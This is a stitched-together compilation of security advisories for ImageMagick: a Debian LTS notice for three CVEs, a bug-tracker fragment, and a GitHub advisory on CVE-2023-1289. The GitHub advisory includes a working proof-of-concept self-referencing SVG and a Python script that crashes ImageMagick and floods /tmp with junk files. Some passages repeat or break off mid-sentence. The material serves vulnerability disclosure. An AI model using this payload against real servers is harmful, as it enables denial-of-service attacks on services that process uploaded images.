Package        : imagemagick
Version        : 8:6.9.10.23+dfsg-2.1+deb10u6
CVE ID         : CVE-2023-1289 CVE-2023-5341 CVE-2023-34151

Imagemagick a graphical software suite for displaying, creating and
modifying images was vulnerable.

CVE-2023-1289

    A vulnerability was discovered
    in ImageMagick where a specially created SVG file
    loads itself and causes a segmentation fault.
    This flaw allows a remote attacker to pass a
    specially crafted SVG file that leads to a segmentation
    fault, generating many trash files in "/tmp," resulting in
    a denial of service. When ImageMagick crashes, it generates
    a lot of trash files. These trash files can be large if the
    SVG file contains many render actions.

CVE-2023-5341

    A heap use-after-free flaw was found in coders/bmp.c

CVE-2023-34151

    A vulnerability was found in ImageMagick,
    due to undefined behaviors of casting double to size_t in
    svg, mvg and other coders

Moreover a few potential security problems were fixed in the
TIFF coders like for instance memory leaks. These issues were
unfortunatly CVE less. CVE-2023-39978 (a deny of service)
was also fixed by being introduced by partial fixes
of these problems.

For Debian 10 buster, these problems have been fixed in version
8:6.9.10.23+dfsg-2.1+deb10u6.

We recommend that you upgrade your imagemagick packages.

For the detailed security status of imagemagick please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/imagemagick>

these updates to your system and frequently asked questions can be

# Debian Long Term Support

Debian Long Term Support (LTS) is a project to extend the lifetime of all Debian stable releases to (at least) 5 years. Debian LTS is not handled by the Debian Security and Release teams, but by a separate group of volunteers and companies interested in making it a success.

Thus the Debian LTS team takes over security maintenance of the various releases once the Debian Security team stops its work.

This flaw allows a remote attacker to pass a specially crafted SVG file that leads to a segmentation fault, generating many trash files in "/tmp," resulting in a denial of service. When ImageMagick crashes, it generates a lot of trash files. These trash files can be large if the SVG file contains many render actions. In a denial of service attack, if a remote attacker uploads an SVG file of size t, ImageMagick generates files of size 103\*t. If an attacker uploads a 100M SVG, the server will generate about 10G. | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2023-03-09 17:54:22 UTC | | | Embargoed: |  | | |

Remote attackers can take advantage of this vulnerability to cause a denial of service of the generated SVG file.

# Specially crafted SVG leads to segmentation fault and generate trash files in "/tmp", possible to leverage DoS

Moderate

published
GHSA-j96m-mjp6-99xr
Mar 9, 2023

## Package

ImageMagick
(APP)

## Affected versions

<=7.1.0; <=6.9.11

## Patched versions

7.1.1

## Description

### Summary

Specially crafted SVG file make segmentation fault and generate trash files in "/tmp", possible to leverage DoS.

### Operating system, version and so on

Linux, Debian (Buster) LTS core 5.10 / Parrot OS 5.1 (Electro Ara)

### Tested ImageMagick version

6.9.11-60, 7.1.0-62

### Details

A specially created SVG file that loads by itself and make segmentation fault. Remote attackers can take advantage of this vulnerability to cause a denial of service of the generated SVG file.

It seems that this error affects a lot of websites and causes a generating trash files in `/tmp` when uploading this PC file to the server.

I think it's better to check the file descriptor coming from itself before executing `read()`.

### PoC

1. Generate SVG file:

```
<!DOCTYPE test>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<image height="200" width="200" xlink:href="bad.svg" />
</svg>

```

2. Run some commands for verification:

```

### Impact

Possible DOS, because when ImageMagick crashes it generates a lot of trash files. This trash file can be large, if SVG file contains many render action.

### Additional impact

In DOS attack if remount attacker uploads an SVG file of size t, ImageMagick generates files of size 103\*t. This means that if an attacker uploads a 100 M SVG, the server will generate about 10 G.

Example:

```
$cat dos_poc.py
open("bad_dos.svg", "w").write("""<?xml version="1.0"?>
<?xml-stylesheet href="https://example.com/style.xsl" type="text/xsl" ?>
<!DOCTYPE test>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<image height="200" width="200" href="bad_dos.svg&quot;""" + "0"*(1024*1021) +  """&quot;" />
</svg>""")
$rm -rf /tmp/magick-*
$python3 dos_poc.py
$du -h bad_dos.svg
1,0M	bad_dos.svg
$../magick convert -font OpenSymbol bad_dos.svg t.jpg
Segmentation fault
$cat /tmp/magick-* > dos_k.txt
$du -h dos_k.txt
103M	dos_k.txt

```

P. S. If ImageMagick will work in Docker container this attack will crash server where docker running. Because the size of the docker container will increase.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
